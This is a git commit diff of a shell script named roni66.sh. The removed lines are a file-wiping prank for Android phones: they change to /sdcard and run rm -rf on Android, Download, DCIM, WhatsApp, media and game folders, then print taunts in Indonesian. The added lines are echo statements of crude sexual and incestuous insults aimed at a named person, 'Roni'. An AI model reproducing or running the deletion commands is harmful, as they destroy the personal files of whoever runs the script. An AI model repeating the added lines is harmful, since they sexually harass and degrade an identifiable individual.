742807a421e3a65516407f185a4aacf211dec790
MR.ERROR <73551794+MR-ERROR20@users.noreply.github.com>
2020-11-01 05:30:17 +0700

    Update roni66.sh

--- roni66.sh
+++ roni66.sh
@@ -1,14 +1,12 @@
-cd /sdcard
-rm -rf Android
-rm -rf Download
-rm -rf DCIM
-rm -rf UCDownloads
-rm -rf com.garena.game.codm
-rm -rf Music
-rm -rf Pictures
-rm -rf Movies
-rm -rf WhatsApp
+
 echo "Mampus Semua File Lu Hilang"
-echo "Roni Tersakiti Ya Jadi Gini"
-echo "Mangkanya Jangan Macam Macam"
-echo "Fuck You !!"
+echo "Roni suka colmek"
+echo "tadi gw ngecrot mama gw"
+echo "nama gw roni"
+echo "gw suka coli"
+echo "gw coli di wc umum setiap hari"
+echo "karena gw gk punya wc"
+echo "gw roni telcakiti"
+echo "tadi gw di marahin mama gw,terus mama gw ge entod"
+echo "mama gw desahannya mantap bro"
+echo "gw broken home,setiap hari dimarahin mama gw"
